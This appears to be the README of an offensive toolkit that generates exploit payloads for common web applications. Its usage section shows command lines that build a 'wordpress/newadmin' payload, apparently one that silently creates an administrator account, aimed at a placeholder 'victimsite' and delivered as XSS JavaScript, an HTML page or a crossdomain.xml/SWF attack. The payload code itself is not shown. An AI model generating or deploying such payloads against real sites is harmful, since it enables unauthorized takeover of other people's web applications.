# Webapp Exploit Payloads

A collection of payloads for common webapps and a tool to help
generate them.


## Usage:

To list the available payloads:

	$ ./genpayload.py -L 

To generate one big JavaScript file called `out.js`:

	$ ./genpayload.py -p wordpress/newadmin -o out.js

To list valid parameters:

	$ ./genpayload.py -p wordpress/newadmin -H

To pass the parameters through command line:

	$ ./genpayload.py -p wordpress/newadmin -P usernewpage=http://victimsite/blog/wp-admin/user-new.php

To generate payload for crossdomain.xml exploitation:

	$ ./genpayload.py -p wordpress/newadmin -t swf -P usernewpage=http://victimsite/blog/wp-admin/user-new.php

To generate payload with an html file:

	$ ./genpayload.py -p wordpress/newadmin -t htmljs -P usernewpage=http://victimsite/blog/wp-admin/user-new.php

## Payload types

### JS

Outputs a single JavaScript file that contains all the necessary libraries, such as 
jQuery. This can then be included in your XSS. Can also be compressed if need be. 

### HTMLJS

Creates a directory containing `index.html` and the included libraries. The html
file contains the payload JavaScript. 

### SWF

Creates a directory containing `index.html` and all libraries, including the
files needed for flXHR.
